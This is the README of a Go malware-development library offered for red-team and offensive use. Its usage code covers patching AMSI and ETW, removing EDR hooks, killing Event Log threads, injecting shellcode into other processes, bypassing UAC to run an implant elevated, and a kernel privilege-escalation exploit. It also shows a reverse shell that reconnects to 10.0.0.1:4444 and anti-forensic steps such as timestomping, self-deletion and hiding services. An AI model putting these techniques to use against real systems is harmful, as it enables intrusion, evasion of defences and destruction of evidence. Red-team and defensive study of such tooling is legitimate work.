# maldev

Modular malware development library in Go for offensive security research and red team operations.

## Overview

maldev is a workspace-based Go library that provides composable building blocks for implant development, shellcode injection, defense evasion, and command-and-control infrastructure. The library is organized into layered packages with clear dependency boundaries: pure cryptographic utilities at the bottom, Windows API primitives in the middle, and high-level techniques (evasion, injection, C2) at the top. Every technique package includes MITRE ATT&CK mappings, detection-level ratings, and cross-platform support where applicable.

## Architecture

```
Layer 0 (pure)     crypto/  encode/  hash/  random/
                        |
Layer 1 (OS)       win/api  win/syscall  win/ntapi  win/token  win/privilege  win/version
                        |
Layer 2 (tech)     evasion/*  inject/  process/  pe/  cleanup/  system/  uacbypass/
                        |
Layer 3 (orch)     c2/transport  c2/shell  c2/meterpreter  c2/cert
                        |
Exploits           exploit/cve202430088
Executables        cmd/rshell
Internal           internal/compat (slog/cmp/slices polyfills for Go 1.21)
```

Dependencies flow strictly bottom-up. Layer 0 packages are pure Go with no OS interaction. Layer 1 wraps Windows APIs behind a single `win/api` package that serves as the source of truth for all DLL handles. Layer 2 implements offensive techniques. Layer 3 orchestrates transport, shells, and staging. The `win/syscall` package provides a pluggable `Caller` that any technique can accept to route NT calls through WinAPI, NativeAPI, direct syscalls, or indirect syscalls.

## Quick Start

### AES Encrypt and Decrypt

```go
package main

import (
	"fmt"
	"log"

	"github.com/oioio-space/maldev/crypto"
)

func main() {
	key, err := crypto.NewAESKey() // 32-byte random key
	if err != nil {
		log.Fatal(err)
	}

	plaintext := []byte("sensitive payload data")

	ciphertext, err := crypto.EncryptAESGCM(key, plaintext)
	if err != nil {
		log.Fatal(err)
	}

	decrypted, err := crypto.DecryptAESGCM(key, ciphertext)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(string(decrypted)) // "sensitive payload data"
}
```

### Inject Shellcode on Windows

```go
package main

import (
	"log"

	"github.com/oioio-space/maldev/inject"
)

func main() {
	shellcode, err := inject.Read("payload.bin")
	if err != nil {
		log.Fatal(err)
	}

	// Self-injection with XOR evasion and NtCreateThreadEx
	cfg := &inject.Config{
		Method: inject.MethodCreateThread,
	}
	injector, err := inject.NewInjector(cfg)
	if err != nil {
		log.Fatal(err)
	}
	if err := injector.Inject(shellcode); err != nil {
		log.Fatal(err)
	}
}
```

### Bypass AMSI

```go
package main

import (
	"log"

	"github.com/oioio-space/maldev/evasion/amsi"
)

func main() {
	// Patch AmsiScanBuffer and AmsiOpenSession (nil = use WinAPI)
	if err := amsi.PatchAll(nil); err != nil {
		log.Fatal(err)
	}
}
```

## Package Reference

### Cryptography and Encoding

| Package | Description | Platform |
|---------|-------------|----------|
| `crypto` | AES-256-GCM, ChaCha20-Poly1305, RC4, XOR encryption | Cross-platform |
| `encode` | Base64, Base64URL, UTF-16LE, ROT13, PowerShell encoding | Cross-platform |
| `hash` | MD5, SHA-1, SHA-256, SHA-512, ROR13 (API hashing) | Cross-platform |
| `random` | Cryptographic random strings, bytes, integers, durations | Cross-platform |

### Windows Primitives (`win/`)

| Package | Description | Platform |
|---------|-------------|----------|
| `win/api` | Single source of truth for DLL handles and procedure references | Windows |
| `win/syscall` | Pluggable syscall strategies: WinAPI, NativeAPI, Direct, Indirect | Windows |
| `win/ntapi` | Type-safe wrappers for NT functions (NtAllocateVirtualMemory, etc.) | Windows |
| `win/token` | Token manipulation: open, duplicate, enable/disable privileges, query integrity | Windows |
| `win/privilege` | Admin detection, RunAs elevation, CreateProcessWithLogonW | Windows |
| `win/impersonate` | Thread impersonation with automatic revert | Windows |
| `win/domain` | Domain membership queries via NetGetJoinInformation | Windows |
| `win/version` | OS version detection via RtlGetVersion, UBR, CVE vulnerability checks | Windows |

### Evasion (`evasion/`)

| Package | Technique | MITRE ATT&CK | Detection | Platform |
|---------|-----------|---------------|-----------|----------|
| `evasion/amsi` | AMSI memory patching | T1562.001 -- Impair Defenses | Medium | Windows |
| `evasion/etw` | ETW event write patching | T1562.001 -- Impair Defenses | Medium | Windows |
| `evasion/unhook` | ntdll.dll restoration | T1562.001 -- Impair Defenses | High | Windows |
| `evasion/acg` | Arbitrary Code Guard policy | T1562.001 -- Impair Defenses | Low | Windows 10+ |
| `evasion/blockdlls` | Block non-Microsoft DLLs | T1562.001 -- Impair Defenses | Low | Windows 10+ |
| `evasion/phant0m` | Event Log thread termination | T1562.002 -- Disable Event Logging | High | Windows |
| `evasion/antidebug` | Debugger detection | T1622 -- Debugger Evasion | Low | Cross-platform |
| `evasion/antivm` | VM/hypervisor detection | T1497.001 -- System Checks | Low | Cross-platform |
| `evasion/timing` | CPU-burning delays | T1497.003 -- Time Based Evasion | Low | Cross-platform |
| `evasion/sandbox` | Multi-factor sandbox detection | T1497 -- Sandbox Evasion | Low | Cross-platform |
| `evasion/preset` | Composable technique presets (Minimal/Stealth/Aggressive) | -- | -- | Windows |

<details>
<summary><strong>AMSI Bypass</strong> (<code>evasion/amsi</code>)</summary>

Patches `AmsiScanBuffer` in memory to return `S_OK` (clean), and flips a conditional jump in `AmsiOpenSession` to prevent session initialization. Returns nil if amsi.dll is not loaded.

```go
import "github.com/oioio-space/maldev/evasion/amsi"

// Patch both AmsiScanBuffer and AmsiOpenSession
err := amsi.PatchAll(nil) // nil = WinAPI, or pass a *wsyscall.Caller

// Or patch individually
err = amsi.PatchScanBuffer(nil)
err = amsi.PatchOpenSession(nil)
```

**Advantages:** Fast, reliable, works in-process. Returns nil gracefully when AMSI is not loaded.
**Limitations:** EDR may monitor VirtualProtect calls on amsi.dll memory pages.

</details>

<details>
<summary><strong>ETW Bypass</strong> (<code>evasion/etw</code>)</summary>

Overwrites all five ETW event writing functions (`EtwEventWrite`, `EtwEventWriteEx`, `EtwEventWriteFull`, `EtwEventWriteString`, `EtwEventWriteTransfer`) with `xor rax, rax; ret` (48 33 C0 C3). Also patches `NtTraceEvent` with a single `RET`.

```go
import "github.com/oioio-space/maldev/evasion/etw"

err := etw.PatchAll(nil)     // patches all ETW functions + NtTraceEvent
err = etw.Patch(nil)      // patches only the 5 ETW functions
err = etw.PatchNtTraceEvent(nil) // patches only NtTraceEvent
```

**Advantages:** Silences all ETW telemetry from the current process.
**Limitations:** In-memory ntdll patches are detectable by integrity checks.

</details>

<details>
<summary><strong>ntdll Unhooking</strong> (<code>evasion/unhook</code>)</summary>

Restores original ntdll.dll function bytes from a clean copy to remove EDR user-mode hooks. Three methods ordered by increasing sophistication:

```go
import "github.com/oioio-space/maldev/evasion/unhook"

// Restore first 5 bytes of a single function
err := unhook.ClassicUnhook("NtAllocateVirtualMemory")

// Replace entire .text section from disk copy
err = unhook.FullUnhook()

// Read pristine ntdll from a suspended child process (Perun's Fart)
err = unhook.PerunUnhook()
```

**Advantages:** Removes ALL user-mode hooks when using FullUnhook or PerunUnhook.
**Limitations:** Reading ntdll from disk or spawning child processes is monitored by EDR.

</details>

<details>
<summary><strong>Phant0m</strong> (<code>evasion/phant0m</code>)</summary>

Enumerates and terminates threads belonging to the Windows Event Log service (svchost.exe hosting EventLog), preventing new events from being written while the service appears to still be running.

```go
import "github.com/oioio-space/maldev/evasion/phant0m"

err := phant0m.Kill()
```

**Advantages:** Suppresses event log recording without stopping the service.
**Limitations:** High detection risk -- killing Event Log threads triggers alerts in mature environments.

</details>

<details>
<summary><strong>Sandbox Detection</strong> (<code>evasion/sandbox</code>)</summary>

Aggregates multiple environment checks into a single assessment: debugger detection, VM detection, hardware thresholds (CPU cores, RAM, disk), suspicious usernames/hostnames, analysis tool processes, fake domain DNS resolution, and CPU-burning waits.

```go
import "github.com/oioio-space/maldev/evasion/sandbox"

checker := sandbox.New(sandbox.DefaultConfig())
if sandboxed, reason, _ := checker.IsSandboxed(ctx); sandboxed {
    os.Exit(0) // bail out of sandbox
}
```

**Advantages:** Multi-factor detection reduces false negatives.
**Limitations:** Combined behavior pattern may itself be flagged by advanced sandboxes.

</details>

<details>
<summary><strong>Composable Evasion</strong> (<code>evasion/preset</code>)</summary>

Evasion techniques implement the `evasion.Technique` interface and can be composed into slices for batch application. Three presets are provided for common scenarios.

```go
import (
    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/evasion/preset"
    "github.com/oioio-space/maldev/evasion/unhook"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Presets — ready to use
cfg := &shell.Config{
    Evasion: preset.Stealth(), // AMSI + ETW + unhook common functions
}

// Custom composition
cfg = &shell.Config{
    Evasion: []evasion.Technique{
        amsi.ScanBufferPatch(),
        etw.All(),
        unhook.Classic("NtAllocateVirtualMemory"),
        unhook.Classic("NtCreateThreadEx"),
    },
}

// With direct syscalls for maximum stealth
caller := wsyscall.New(wsyscall.MethodDirect, wsyscall.NewHellsGate())
evasion.ApplyAll(preset.Stealth(), caller)
```

| Preset | Techniques | Detection Risk |
|--------|-----------|----------------|
| `preset.Minimal()` | AMSI + ETW | Low |
| `preset.Stealth()` | + unhook 10 common NT functions | Medium |
| `preset.Aggressive()` | + full ntdll unhook + ACG + BlockDLLs | High |

</details>

<details>
<summary><strong>Hook Detection</strong> (<code>evasion/unhook</code>)</summary>

Detect which ntdll functions have been hooked by EDR and inspect their prologues.

```go
import "github.com/oioio-space/maldev/evasion/unhook"

// Detect which functions are hooked by EDR
hooked, _ := unhook.DetectHooked(unhook.CommonHookedFunctions)
fmt.Println("Hooked:", hooked)

// Inspect prologues
infos, _ := unhook.Inspect(unhook.CommonHookedFunctions)
for _, info := range infos {
    status := "clean"
    if info.Hooked { status = "HOOKED" }
    fmt.Printf("%-30s %s  %02X\n", info.Name, status, info.Prologue)
}
```

</details>

<details>
<summary><strong>AntiVM — Parameterizable Config</strong> (<code>evasion/antivm</code>)</summary>

VM detection supports bitmask-based check selection for fine-grained control over which detection dimensions to evaluate.

```go
import "github.com/oioio-space/maldev/evasion/antivm"

// Default: check everything
vendor := antivm.DetectVM()

// Custom: only check processes and CPUID (fast, no disk access)
cfg := antivm.Config{
    Checks: antivm.CheckProcess | antivm.CheckCPUID,
}
vendor, _ := antivm.Detect(cfg)

// Detect ALL matching vendors
vendors, _ := antivm.DetectAll(antivm.DefaultConfig())
```

</details>

<details>
<summary><strong>Sandbox Detection — Parameterizable Config</strong> (<code>evasion/sandbox</code>)</summary>

Multi-factor sandbox detection with tunable thresholds and check behavior.

```go
import "github.com/oioio-space/maldev/evasion/sandbox"

// Quick check
checker := sandbox.New(sandbox.DefaultConfig())
detected, reason, _ := checker.IsSandboxed(ctx)

// Detailed results
results := checker.CheckAll(ctx)
for _, r := range results {
    if r.Detected {
        fmt.Printf("[!] %s: %s\n", r.Name, r.Detail)
    }
}

// Custom config
cfg := sandbox.DefaultConfig()
cfg.MinRAMGB = 8
cfg.StopOnFirst = false
cfg.BadProcesses = append(cfg.BadProcesses, "custom-analyzer")
```

</details>

### Process Injection (`inject/`)

| Method | Constant | Platform | Remote | Syscall Support |
|--------|----------|----------|--------|-----------------|
| CreateRemoteThread | `MethodCreateRemoteThread` ("crt") | Windows | Yes | Yes |
| CreateThread (self) | `MethodCreateThread` ("ct") | Windows | No | Yes |
| QueueUserAPC | `MethodQueueUserAPC` ("apc") | Windows | Yes | Yes |
| Early Bird APC | `MethodEarlyBirdAPC` ("earlybird") | Windows | Spawned | Yes |
| Thread Execution Hijacking | `MethodThreadHijack` ("threadhijack") | Windows | Spawned | Yes |
| RtlCreateUserThread | `MethodRtlCreateUserThread` ("rtl") | Windows | Yes | Yes |
| Direct Syscall | `MethodDirectSyscall` ("syscall") | Windows | No | N/A |
| CreateFiber | `MethodCreateFiber` ("fiber") | Windows | No | Yes |
| Ptrace | `MethodPtrace` ("ptrace") | Linux | Yes | N/A |
| MemFD | `MethodMemFD` ("memfd") | Linux | No | N/A |
| ProcMem (mmap) | `MethodProcMem` ("procmem") | Linux | No | N/A |
| PureGo Shellcode | `MethodPureGoShellcode` ("purego") | Linux | No | N/A |
| PureGo Meterpreter | `MethodPureGoMeterpreter` ("purego-meter") | Linux | No | N/A |

**Remote injection into an existing process:**

```go
import "github.com/oioio-space/maldev/inject"

shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodCreateRemoteThread,
    PID:    1234,
}
injector, _ := inject.NewInjector(cfg)
injector.Inject(shellcode)
```

**Injection with automatic fallback:**

```go
cfg := &inject.Config{
    Method:   inject.MethodCreateRemoteThread,
    PID:      1234,
    Fallback: true,
}
// Tries CRT -> QueueUserAPC -> RtlCreateUserThread
err := inject.InjectWithFallback(cfg, shellcode)
```

**Injection with syscall bypass (EDR evasion):**

```go
import (
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

cfg := &inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateRemoteThread, PID: 1234},
    SyscallMethod: wsyscall.MethodIndirect,
    // SyscallResolver defaults to Chain(HellsGate, HalosGate) when nil
}
injector, _ := inject.NewWindowsInjector(cfg)
injector.Inject(shellcode)
```

### Process Management (`process/`)

| Package | Description | MITRE ATT&CK | Platform |
|---------|-------------|---------------|----------|
| `process/enum` | Process enumeration by name or PID | T1057 -- Process Discovery | Cross-platform |
| `process/session` | Cross-session process creation and impersonation | T1134.002 -- Create Process with Token | Windows |

```go
import "github.com/oioio-space/maldev/process/enum"

procs, _ := enum.FindByName("explorer.exe")
for _, p := range procs {
    fmt.Printf("PID=%d PPID=%d\n", p.PID, p.PPID)
}
```

### PE Operations (`pe/`)

| Package | Description | MITRE ATT&CK | Platform |
|---------|-------------|---------------|----------|
| `pe/parse` | PE file parsing: sections, exports, imports, image base | -- | Cross-platform |
| `pe/morph` | UPX header mutation to break unpackers | T1027.002 -- Software Packing | Cross-platform |
| `pe/srdi` | DLL-to-shellcode conversion (sRDI) | T1055.001 -- DLL Injection | Cross-platform |

```go
import "github.com/oioio-space/maldev/pe/srdi"

cfg := srdi.DefaultConfig()
cfg.FunctionName = "MyExport"  // optional: call a specific export
cfg.ClearHeader = true         // evasion: wipe PE header after load

shellcode, err := srdi.ConvertDLL("payload.dll", cfg)
```

### Cleanup and Anti-Forensics (`cleanup/`)

| Package | Technique | MITRE ATT&CK | Platform |
|---------|-----------|---------------|----------|
| `cleanup/selfdelete` | Self-deletion via NTFS ADS, batch script, MoveFileEx | T1070.004 -- File Deletion | Windows |
| `cleanup/service` | Service hiding via DACL manipulation | T1564 / T1543.003 -- Hide Artifacts | Windows |
| `cleanup/wipe` | Multi-pass random overwrite before deletion | T1070.004 -- File Deletion | Cross-platform |
| `cleanup/timestomp` | File timestamp manipulation | T1070.006 -- Timestomp | Cross-platform |

```go
import (
    "github.com/oioio-space/maldev/cleanup/selfdelete"
    "github.com/oioio-space/maldev/cleanup/service"
    "github.com/oioio-space/maldev/cleanup/wipe"
    "github.com/oioio-space/maldev/cleanup/timestomp"
)

// Self-delete the running executable via NTFS ADS rename
err := selfdelete.Run()

// Secure wipe: 3-pass random overwrite then delete
err = wipe.File("/tmp/artifact.bin", 3)

// Clone timestamps from a reference file
err = timestomp.CopyFrom("C:\\Windows\\System32\\kernel32.dll", "implant.exe")

// Hide a service (restrict DACL)
output, _ := service.HideService(service.Native, "", "MyService")

// Restore default DACL
output, _ = service.UnHideService(service.Native, "", "MyService")
```

### Command and Control (`c2/`)

| Package | Description | MITRE ATT&CK | Platform |
|---------|-------------|---------------|----------|
| `c2/transport` | TCP/TLS transport with certificate pinning | -- | Cross-platform |
| `c2/shell` | Reverse shell with reconnection, PTY, evasion | T1059 -- Command and Scripting Interpreter | Cross-platform |
| `c2/meterpreter` | Meterpreter stager (TCP/HTTP/HTTPS) | T1059 -- Command and Scripting Interpreter | Cross-platform |
| `c2/cert` | Self-signed X.509 certificate generation | -- | Cross-platform |

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/c2/transport"
    "github.com/oioio-space/maldev/evasion/preset"
)

trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)

cfg := &shell.Config{
    MaxRetries:    0, // unlimited reconnection
    ReconnectWait: 5 * time.Second,
    Evasion:       preset.Stealth(), // AMSI + ETW + unhook common functions
}

sh := shell.New(trans, cfg)
sh.Start(context.Background())
```

### Privilege Escalation

| Package | Technique | MITRE ATT&CK | Platform |
|---------|-----------|---------------|----------|
| `uacbypass` | FODHelper, SLUI, SilentCleanup, EventVwr | T1548.002 -- Bypass UAC | Windows |
| `exploit/cve202430088` | Kernel TOCTOU race for LPE to SYSTEM | CVE-2024-30088 (CVSS 7.0) | Windows |

```go
import "github.com/oioio-space/maldev/uacbypass"

// Execute a program with elevated privileges (no UAC prompt)
err := uacbypass.FODHelper(`C:\Windows\System32\cmd.exe`)
err = uacbypass.SilentCleanup(`C:\implant.exe`)
err = uacbypass.EventVwr(`C:\implant.exe`)
```

### System Information (`system/`)

| Package | Description | Platform |
|---------|-------------|----------|
| `system/drive` | Drive enumeration, monitoring, volume info | Windows |
| `system/network` | IP address retrieval, local address detection | Cross-platform |
| `system/folder` | Windows special folder paths (CSIDL) | Windows |
| `system/ui` | Message boxes and system sounds | Windows |

## Syscall Methods

The `win/syscall` package provides a `Caller` that routes NT function calls through four strategies, allowing the same injection or evasion code to transparently switch between detectable WinAPI calls and stealthy indirect syscalls.

| Method | Constant | Bypass kernel32 hooks | Bypass ntdll hooks | Survive memory scan | Survive stack analysis |
|--------|----------|----------------------|-------------------|--------------------|-----------------------|
| WinAPI | `MethodWinAPI` | No | No | -- | -- |
| NativeAPI | `MethodNativeAPI` | Yes | No | -- | -- |
| Direct | `MethodDirect` | Yes | Yes | No | -- |
| Indirect | `MethodIndirect` | Yes | Yes | Yes | Yes |

**SSN Resolvers** determine the Syscall Service Number for each NT function:

| Resolver | Function | Handles hooked functions |
|----------|----------|------------------------|
| `NewHellsGate()` | Reads SSN from ntdll prologue | No -- fails if hooked |
| `NewHalosGate()` | Scans neighboring stubs | Yes -- sequential SSN arithmetic |
| `NewTartarus()` | Extends Halo's Gate | Yes -- JMP hook displacement |
| `Chain(r1, r2, ...)` | Tries resolvers in sequence | Yes -- first success wins |

**Example: switching syscall methods**

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

// Standard WinAPI (default, most compatible)
caller := wsyscall.New(wsyscall.MethodWinAPI, nil)

// Direct syscall with Hell's Gate SSN resolution
caller = wsyscall.New(wsyscall.MethodDirect, wsyscall.NewHellsGate())

// Indirect syscall with chained resolvers (most stealthy)
caller = wsyscall.New(
    wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()),
)

// Pass the caller to any technique that accepts *wsyscall.Caller
err := amsi.PatchScanBuffer(caller)
err = etw.Patch(caller)
err = blockdlls.Enable(caller)
err = acg.Enable(caller)
```

All technique packages that accept a `*wsyscall.Caller` parameter treat `nil` as "use standard WinAPI", making the syscall method entirely opt-in.

## Testing

```bash
# Run safe (non-intrusive) tests
./testutil/run-tests.sh

# Run intrusive tests (requires admin, modifies system state)
./testutil/run-tests.sh --intrusive

# Run Linux tests via Podman
./testutil/run-tests.sh --linux
```

## MITRE ATT&CK Coverage

| Technique ID | Technique Name | Package(s) |
|-------------|---------------|------------|
| T1027.002 | Obfuscated Files: Software Packing | `pe/morph` |
| T1055 | Process Injection | `inject` |
| T1055.001 | Process Injection: DLL Injection | `pe/srdi` |
| T1057 | Process Discovery | `process/enum` |
| T1059 | Command and Scripting Interpreter | `c2/shell`, `c2/meterpreter` |
| T1070.004 | Indicator Removal: File Deletion | `cleanup/selfdelete`, `cleanup/wipe` |
| T1070.006 | Indicator Removal: Timestomp | `cleanup/timestomp` |
| T1134.002 | Access Token Manipulation: Create Process with Token | `process/session` |
| T1497 | Virtualization/Sandbox Evasion | `evasion/sandbox` |
| T1497.001 | Sandbox Evasion: System Checks | `evasion/antivm` |
| T1497.003 | Sandbox Evasion: Time Based Evasion | `evasion/timing` |
| T1543.003 | Create or Modify System Process: Windows Service | `cleanup/service` |
| T1548.002 | Abuse Elevation Control: Bypass UAC | `uacbypass` |
| T1562.001 | Impair Defenses: Disable or Modify Tools | `evasion/amsi`, `evasion/etw`, `evasion/unhook`, `evasion/acg`, `evasion/blockdlls` |
| T1562.002 | Impair Defenses: Disable Windows Event Logging | `evasion/phant0m` |
| T1564 | Hide Artifacts | `cleanup/service` |
| T1622 | Debugger Evasion | `evasion/antidebug` |

## Build

```bash
# Build all packages (excludes ignore/)
go build $(go list ./...)

# Cross-compile for Linux
GOOS=linux GOARCH=amd64 go build $(go list ./...)

# Build with size optimization
go build -ldflags="-s -w" $(go list ./...)

# Run all tests
go test $(go list ./...)
```

**Requirements:**
- Go 1.21+
- Windows SDK headers are NOT required -- all syscalls use `golang.org/x/sys/windows`
- CGO is optional -- the `inject` package supports pure Go execution on Linux via `purego`

## Project Structure

```
maldev/
+-- crypto/                AES-GCM, ChaCha20, RC4, XOR
+-- encode/                Base64, UTF-16LE, ROT13, PowerShell encoding
+-- hash/                  MD5, SHA-256, SHA-512, ROR13 (API hashing)
+-- random/                Cryptographic random generation
+-- win/
|   +-- api/               DLL handles, procedure refs, memory patching
|   +-- syscall/           Pluggable syscall strategies (WinAPI/Direct/Indirect)
|   +-- ntapi/             Type-safe NT function wrappers
|   +-- token/             Token manipulation and privilege management
|   +-- privilege/         Admin detection, RunAs, elevation helpers
|   +-- impersonate/       Thread impersonation
|   +-- domain/            Domain membership queries
|   +-- version/           OS version detection, CVE checks
+-- evasion/
|   +-- amsi/              AMSI memory patching
|   +-- etw/               ETW event write patching
|   +-- unhook/            ntdll restoration (Classic, Full, Perun)
|   +-- acg/               Arbitrary Code Guard policy
|   +-- blockdlls/         Non-Microsoft DLL blocking
|   +-- phant0m/           Event Log thread termination
|   +-- antidebug/         Debugger detection
|   +-- antivm/            VM/hypervisor detection
|   +-- timing/            CPU-burning time delays
|   +-- sandbox/           Multi-factor sandbox detection
|   +-- preset/            Composable technique presets
+-- inject/                Shellcode injection (8 Win + 5 Linux methods)
+-- process/
|   +-- enum/              Cross-platform process enumeration
|   +-- session/           Cross-session execution
+-- pe/
|   +-- parse/             PE file parsing (sections, exports, imports)
|   +-- morph/             UPX header mutation
|   +-- srdi/              DLL-to-shellcode conversion (sRDI)
+-- cleanup/
|   +-- selfdelete/        Self-deletion (NTFS ADS, script, reboot)
|   +-- service/           Service hiding (DACL)
|   +-- wipe/              Secure file wiping
|   +-- timestomp/         Timestamp manipulation
+-- c2/
|   +-- cert/              X.509 certificate generation
|   +-- transport/         TCP/TLS transport with cert pinning
|   +-- shell/             Reverse shell with reconnection
|   +-- meterpreter/       Meterpreter staging (TCP/HTTP/HTTPS)
+-- uacbypass/             UAC bypass (FODHelper, SLUI, SilentCleanup, EventVwr)
+-- exploit/
|   +-- cve202430088/      CVE-2024-30088 kernel LPE
+-- system/
|   +-- drive/             Drive detection and monitoring
|   +-- network/           IP and local address detection
|   +-- folder/            Windows special folder paths
|   +-- ui/                Message boxes, system sounds
+-- cmd/
|   +-- rshell/            Standalone reverse shell binary
+-- internal/
|   +-- compat/            Go version compatibility shims
+-- testutil/              Test harness and helpers
```

## License

This project is for authorized security research, red team operations, and penetration testing only. Unauthorized use against systems you do not own or have explicit permission to test is prohibited.
